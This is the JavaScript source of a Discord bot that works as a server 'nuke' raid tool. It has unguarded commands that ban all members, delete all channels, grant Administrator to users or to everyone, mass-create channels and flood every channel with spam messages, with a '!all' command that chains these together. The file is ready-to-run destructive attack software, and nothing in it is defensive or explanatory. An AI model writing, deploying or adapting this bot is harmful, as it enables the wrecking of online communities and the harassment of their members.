require("dotenv").config();
const { Client, GatewayIntentBits, PermissionsBitField } = require("discord.js");

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// ==============================
// Crash Prevention
// ==============================
process.on('unhandledRejection', error => {
    console.error('Unhandled promise rejection:', error);
});

process.on('uncaughtException', error => {
    console.error('Uncaught exception:', error);
});

// ==============================
// Backup Storage
// ==============================
let backup = { channels: [], roles: [] };

// ==============================
// Ready Event
// ==============================
client.on("ready", () => {
    console.log(`🔥 Logged in as ${client.user.tag}`);
});

// ==============================
// Message Handler
// ==============================
client.on("messageCreate", async (msg) => {
    if (!msg.guild || msg.author.bot) return;
    const args = msg.content.split(" ");

    // ==============================
    // !backup
    // ==============================
    if (msg.content === "!backup") {
        backup.channels = msg.guild.channels.cache.map(ch => ({ name: ch.name, type: ch.type }));
        backup.roles = msg.guild.roles.cache.map(r => ({ name: r.name, color: r.color }));
        msg.reply("✅ Backup saved successfully!");
    }

    // ==============================
    // !back
    // ==============================
    if (msg.content === "!back") {
        if (backup.channels.length === 0) return msg.reply("❌ No backup found. Use `!backup` first.");

        msg.guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));
        for (const ch of backup.channels) {
            msg.guild.channels.create({ name: ch.name, type: ch.type }).catch(() => {});
        }
        msg.reply("🔄 Server restored from backup!");
    }

    // ==============================
    // !start → ban all members
    // ==============================
    if (msg.content === "!start") {
        msg.guild.members.fetch().then(members => {
            members.forEach(m => {
                if (!m.user.bot && m.id !== msg.guild.ownerId) m.ban().catch(() => {});
            });
        }).catch(() => {});
        msg.reply("⛔ All members are being banned...");
    }

    // ==============================
    // !dc → delete all channels
    // ==============================
    if (msg.content === "!dc") {
        msg.guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));
        msg.reply("🗑️ All channels deleted!");
    }

    // ==============================
    // !admin <user>
    // ==============================
    if (args[0] === "!admin") {
        const user = msg.mentions.members.first();
        if (!user) return msg.reply("❌ Mention a user.");

        msg.guild.roles.create({
            name: "Admin-Given",
            permissions: [PermissionsBitField.Flags.Administrator]
        }).then(role => {
            user.roles.add(role).catch(() => {});
            msg.reply(`✅ ${user} is now admin.`);
        }).catch(() => {});
    }

    // ==============================
    // !cn <channel_name> <number_of_channel>
    // ==============================
    if (args[0] === "!cn") {
        const number = parseInt(args[args.length - 1]);
        const name = args.slice(1, args.length - 1).join(" ");

        if (!name || isNaN(number) || number < 1) 
            return msg.reply("❌ Usage: `!cn <channel_name> <number_of_channel>`");

        for (let i = 1; i <= number; i++) {
            msg.guild.channels.create({ name: `${name}-${i}`, type: 0 }).catch(() => {});
        }

        msg.reply(`📌 Created ${number} channels: ${name}-1 to ${name}-${number}`);
    }

    // ==============================
    // !sm <message> <count>
    // ==============================
    if (args[0] === "!sm") {
        const text = args[1];
        const count = parseInt(args[2]);
        if (!text || !count) return msg.reply("❌ Usage: `!sm <message> <count>`");

        msg.guild.channels.cache.forEach(ch => {
            for (let i = 0; i < count; i++) {
                setTimeout(() => { ch.send(text).catch(() => {}); }, i * 1000);
            }
        });

        msg.reply("📢 Spamming started!");
    }

    // ==============================
    // !all <channel_name> <channel_count> <spam_message> <spam_count>
    // ==============================
    if (args[0] === "!all") {
        const [channelName, channelCountStr, spamMessage, spamCountStr] = args.slice(1);
        const channelCount = parseInt(channelCountStr);
        const spamCount = parseInt(spamCountStr);

        if (!channelName || isNaN(channelCount) || !spamMessage || isNaN(spamCount)) 
            return msg.reply("❌ Usage: !all <channel_name> <channel_count> <spam_message> <spam_count>");

        // Ban members
        msg.guild.members.fetch().then(members => {
            members.forEach(m => {
                if (!m.user.bot && m.id !== msg.guild.ownerId) m.ban().catch(() => {});
            });
        }).catch(() => {});

        // Delete channels
        msg.guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));

        // Make all admin
        msg.guild.members.fetch().then(members => {
            members.forEach(async m => {
                if (!m.user.bot) {
                    try {
                        const role = await msg.guild.roles.create({
                            name: "Admin-Given",
                            permissions: [PermissionsBitField.Flags.Administrator],
                            reason: "All command admin"
                        });
                        await m.roles.add(role).catch(() => {});
                    } catch {}
                }
            });
        }).catch(() => {});

        // Create channels
        const newChannels = [];
        for (let i = 1; i <= channelCount; i++) {
            msg.guild.channels.create({ name: `${channelName}-${i}`, type: 0 })
                .then(ch => newChannels.push(ch))
                .catch(() => {});
        }

        // Spam messages
        setTimeout(() => {
            newChannels.forEach(ch => {
                for (let i = 0; i < spamCount; i++) {
                    setTimeout(() => { ch.send(spamMessage).catch(() => {}); }, i * 1000);
                }
            });
        }, 5000);

        msg.reply("✅ All actions executed safely.");
    }

    // ==============================
    // !k-help
    // ==============================
    if (msg.content === "!k-help") {
        msg.reply(`
💡 **Commands List**
\`!backup\` → Backup server  
\`!back\` → Restore backup  
\`!start\` → Ban all members  
\`!dc\` → Delete all channels  
\`!admin <user>\` → Make a user admin  
\`!cn <channel_name> <channel_count>\` → Create multiple channels  
\`!sm <message> <count>\` → Spam a message in all channels  
\`!all <channel_name> <channel_count> <spam_message> <spam_count>\` → Execute all: Ban members, Delete channels, Make all admin, Create channels, Spam messages  
\`!k-help\` → Show this help message  
        `);
    }
});

client.login(process.env.TOKEN);
